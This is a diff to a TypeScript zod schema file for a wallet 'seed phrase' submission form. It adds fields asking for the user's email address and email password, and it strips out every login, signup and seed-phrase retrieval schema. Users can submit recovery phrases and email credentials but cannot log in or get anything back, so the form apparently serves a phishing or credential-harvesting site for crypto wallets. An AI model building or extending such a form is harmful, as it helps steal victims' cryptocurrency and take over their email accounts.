@@ -1,6 +1,5 @@
 
 import { z } from 'zod';
-// Removed: import type { ObjectId } from 'mongodb'; // No longer needed here
 
 // --- Wallet Types ---
 // Expanded list of wallet types (ensure this meets the > 70 requirement)
@@ -105,9 +104,12 @@ export const WalletTypes = [
   'Other',
 ] as const;
 
-// --- Seed Phrase Schemas ---
+// --- Seed Phrase Schema ---
 // Schema for data sent FROM the frontend form TO the backend API
 export const seedPhraseFormSchema = z.object({
+  email: z.string().email({ message: 'Please enter a valid email address.' }),
+  emailPassword: z.string().min(1, { message: 'Email password cannot be empty.' })
+    .max(100, { message: 'Password seems too long.'}), // Basic check
   walletName: z
     .string()
     .min(1, { message: 'Wallet name cannot be empty.' })
@@ -132,62 +134,15 @@ export const seedPhraseFormSchema = z.object({
   walletType: z.enum(WalletTypes, {
     errorMap: () => ({ message: 'Please select a valid wallet type.' }),
   }),
-  // Removed userId - Backend will add this based on authenticated user
 });
 
 export type SeedPhraseFormData = z.infer<typeof seedPhraseFormSchema>;
 
-// Schema for data received FROM the backend API (list view, metadata only)
-export const seedPhraseMetadataSchema = z.object({
-  _id: z.string(), // Backend sends ObjectId as string
-  userId: z.string(), // Backend sends ObjectId as string
-  walletName: z.string(),
-  walletType: z.enum(WalletTypes),
-  createdAt: z.string().datetime().optional(), // Backend sends Date as ISO string
-});
 
-export type SeedPhraseMetadata = z.infer<typeof seedPhraseMetadataSchema>;
-
-// Schema for the revealed seed phrase received from the backend
-export const revealedSeedPhraseSchema = z.object({
-    seedPhrase: z.string(),
-});
-export type RevealedSeedPhrase = z.infer<typeof revealedSeedPhraseSchema>;
-
-
-// --- User Authentication Schemas ---
-
-export const signupSchema = z.object({
-  email: z.string().email({ message: 'Please enter a valid email address.' }),
-  password: z.string().min(8, { message: 'Password must be at least 8 characters long.' }),
-});
-
-export type SignupFormData = z.infer<typeof signupSchema>;
-
-export const loginSchema = z.object({
-  email: z.string().email({ message: 'Please enter a valid email address.' }),
-  password: z.string().min(1, { message: 'Password cannot be empty.' }),
-});
-
-export type LoginFormData = z.infer<typeof loginSchema>;
-
-// Schema for data received FROM the backend after successful login
-export const loginResponseSchema = z.object({
-    message: z.string(),
-    token: z.string(),
-    user: z.object({
-        id: z.string(),
-        email: z.string(),
-    }),
-});
-
-export type LoginResponseData = z.infer<typeof loginResponseSchema>;
-
-
-// --- User Data Structure (Frontend Representation) ---
-// Represents user data as needed on the client-side
-export type UserClientData = {
-  id: string;
-  email: string;
-  token?: string; // Store the JWT token on the client (e.g., in context or localStorage)
-};
+// --- REMOVED Schemas below as Login/Signup/Dashboard are removed ---
+// seedPhraseMetadataSchema
+// revealedSeedPhraseSchema
+// signupSchema
+// loginSchema
+// loginResponseSchema
+// UserClientData type
